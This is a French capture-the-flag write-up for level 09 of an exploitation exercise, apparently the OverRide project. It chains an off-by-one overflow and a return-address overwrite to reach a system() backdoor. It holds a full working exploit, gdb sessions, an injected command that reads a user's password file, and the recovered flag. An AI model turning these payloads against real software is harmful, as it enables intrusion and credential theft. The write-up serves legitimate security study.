# Level 09

## Introduction

Le programme accepte deux entrées : `username` et `message`. Le champ `username` à une vulnérabilité (overflow d'un caractère). Qui permet d'écraser la longueur utilisé par strncpy par `message`. Ensuite avec un padding de 200 caractères, on peut écraser le rip par l'adresse de la fonction `secret_backdoor` qui contient un appel à la fonction `system`.

## Resumé

 1. Décompiler le programme : https://dogbolt.org/?id=f1613b2e-2c3d-4b75-97e9-8137a7378884 ;
 2. Trouver la première vulnérabilité (avec `username`) ;
 3. Trouver le padding de la deuxième vulnérabilité (avec `message`) ;
 4. Ecraser le rip avec l'adresse de `secret_backdoor` ;
 5. Contaster que `system` à pour argument le contenu de `message`.

## Etapes 

(Voir [source.c](../source.c) pour le code complet)

### Ecrasement de la taille autorisée

L'écrasement se fait au 41ème caractère :

```c
run < <(python -c 'print "A" * 40 + "b"'; python -c 'print "B"')
```

Pour le debug, on suit le contenu de la structure avec :

```sh
b *handle_msg+100

set $buf = $rbp-0xc0
x/180cb $buf # message + username
x/140cb $buf # message
x/40cb $buf+140 # username
x/dh $buf+140+40 # length
```

Et donc si on veut tester cette première vulnérabilité :

```sh
(gdb) b *handle_msg+92
(gdb) run < <(python -c 'print "A" * 40 + "\xca"'; python -c 'print "B"')
(gdb) x/4xb 0x7fffffffe510+140+40
0x7fffffffe5c4: 0xc9    0x00    0x00    0x00
(gdb) x/dh 0x7fffffffe510+140+40
0x7fffffffe5c4: 201
```

`\xca` (202) c'est la valeur minimum qui permet l'exploit pour pouvoir écrire le padding de 200.

### Adresse de secret_backdoor

L'adresse de secret_backdoor est `0x55555555488c`.

```c
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

### Exploit complet

Après quelques essais et en sachant que je devais dépasser `sizeof(t_message)` (192), j'ai trouvé que le padding pour écraser le `rip` est de 200.

```sh
(python -c 'print "A" * 40 + "\xca"'; python -c 'print "B" * 200 + "\x8C\x48\x55\x55\x55\x55"') | ./level09
```

A partir de cet essai, on en déduit qu'on peut injecter une commande sh dans le deuxième argument :

```sh
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xca"'; python -c 'print "B" * 200 + "\x8C\x48\x55\x55\x55\x55"') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
sh: 1: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB: not found
Segmentation fault (core dumped)
```

Et donc on obtient :

*128 correspond à la taille du `fgets` dans `secret_backdoor`.*

```sh
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xca"'; python -c 'print "B" * 72 + "whoami;cat /home/users/end/.pass;#" + "A" * (128 - 34) + "\x8C\x48\x55\x55\x55\x55"') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
end
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```

On a donc le flag :

```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

Et c'est donc la fin :

```
level09@OverRide:~$ su end
Password:
end@OverRide:~$ ls
end
end@OverRide:~$ cat end
GG !
```